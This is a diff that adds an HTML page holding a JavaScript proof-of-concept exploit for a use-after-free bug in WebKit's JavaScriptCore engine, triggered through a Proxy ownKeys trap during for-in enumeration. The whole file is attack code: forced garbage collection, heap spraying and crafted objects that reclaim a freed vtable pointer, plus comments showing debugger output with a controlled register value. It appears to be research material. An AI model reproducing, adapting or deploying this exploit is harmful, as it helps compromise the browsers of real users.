@@ -1,0 +1,205 @@
+<html>
+<head>
+</head>
+<body>
+<script>
+
+
+/*
+
+should work on the browser (not very reliable for any affected version..)
+
+expected result:
+
+(lldb) c
+Process 60170 resuming
+Process 60170 stopped
+* thread #1, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=EXC_I386_GPFLT)
+    frame #0: 0x00000003a89de5c0 JavaScriptCore`JSC::handleHostCall(JSC::ExecState*, JSC::JSValue, JSC::CallLinkInfo*) + 272
+JavaScriptCore`JSC::handleHostCall:
+->  0x3a89de5c0 <+272>: movq   0x40(%rax), %rax
+    0x3a89de5c4 <+276>: leaq   -0x48(%rbp), %rsi
+    0x3a89de5c8 <+280>: movq   %rbx, %rdi
+    0x3a89de5cb <+283>: callq  *0x30(%rax)
+Target 0: (com.apple.WebKit.WebContent) stopped.
+(lldb) reg r $rax
+     rax = 0x2042424242424242
+(lldb) 
+
+*/
+
+
+// random string..
+function r_str(l){
+    let random_string = '';
+    let random_ascii;
+    for(let i = 0; i < l; i++) {
+        random_ascii = Math.floor((Math.random() * 25) + 97);
+        random_string += String.fromCharCode(random_ascii)
+    }
+    return random_string
+}
+
+// garbage collection
+function gc() {
+    for (let i = 0; i < 100; i++) {
+        new ArrayBuffer(1024 * 1024 * 10);
+    }
+}
+
+
+var o;
+var o2, o3;
+
+// to trigger the bug
+// in a useful way
+function obj_with_size(n){
+    let s = 'var obj = {';
+    for (let y = 0; y < n; y++){
+        s += 'a' + y + ':' + '"a"' + ',';
+    }
+    s += '}'
+    eval(s);
+    return obj;
+    
+}
+
+// to better align the memory on the cache
+function obj_with_ab(n){
+    let s = 'var obj = {';
+    for (let y = 0; y < n; y++){
+        s += 'a' + y + ':' + 'new ArrayBuffer(0x80)' + ',';
+    }
+    s += '}'
+    eval(s);
+    return obj;
+    
+}
+
+// to reclaim the vftable pointer
+// of the dangling pointer.
+// this memory is on the cache, so we can reallocate it,
+// by caching this.
+function obj_with_o(ooo,n){
+  
+    let s = 'var obj = {';
+    for (let y = 0; y < n; y++){
+        s += 'B'.repeat(1024)+   y + ':' + 'ooo' + ',';
+    }
+    s += '}'
+    eval(s);
+    return obj;
+    
+}
+
+// to spam the cache..
+function opt2(x,y) {
+            
+    function f(a) {
+        return a;
+    }
+        
+    let p = new Proxy(x,{ownKeys:f});
+    y.__proto__ = p;
+    for (let x in y) {
+}}
+
+
+// Magic numbers
+o2 = obj_with_size(46800)
+o3 = obj_with_size(46800)
+o = obj_with_ab(4);
+
+let s2 = [];
+
+function opt(tmp,flag) {
+            
+    function f(a) {
+        if (flag){
+            // trigger uaf here
+            // to then reclaim the vftable pointer
+            gc();
+        }
+        return a;
+    }
+        
+    let p = new Proxy(tmp,{ownKeys:f});
+    o2.__proto__ = p;
+    let y = 0;
+    for (let x in o2) {
+    
+        if (flag) { 
+        
+        // we need the second object,
+        // as it can be confused with a function.
+        if (y===1){
+        
+                  for ( let i = 0; i < 160; i++ ){
+                        let rnds = r_str(8);
+                        let t1 = obj_with_o("A",10000);
+                        let t2 = obj_with_o("A",10000);
+                        t1[rnds] = 1.2;
+                        t2[rnds] = 1.2;                        
+                        
+                    for ( let t = 0; t < 20; t++ ){
+                        opt2(t1,t2);
+                    }
+                        s2.push([t1,t2]);                   
+                }
+                // x v pointer now points
+                // to 0x2042424242424242
+                x();
+                s2 = [];
+                gc();
+                gc();
+                return;
+ 
+             
+        }         
+            
+            let s = typeof x;
+                        
+            if ( s == 'object' ){
+                y=1;
+            } else {
+                if ( typeof x == 'string' ){}
+                else {
+                  print('typeof x:' + typeof x);
+                  print('leaked memory: '+ x);
+                }
+            }
+        } else { 
+          // optimize access ..
+          x = 'AAAAAAAA';        
+        }
+    }
+    
+}
+
+var s = [];
+
+// push this into 
+// a more predictable heap state
+function sprayheap() {
+  for (let i = 0; i < 0x10000; i++) {
+      let a = new Float64Array(1);
+      a['a0'] = 3.54484805889626e-310;
+      s.push(a);
+  }
+}
+
+sprayheap();
+
+while (1){
+  // Compile the functions
+  for (let t = 0; t <200;t++){
+      opt(o3,false);
+  }    
+  let evil = opt(o,true);
+}
+  
+// do not gc s.. so deref it..
+for ( let tt = 0 ; tt < s.length; tt ++ ){s[tt];}
+</script>
+</body>
+</html>
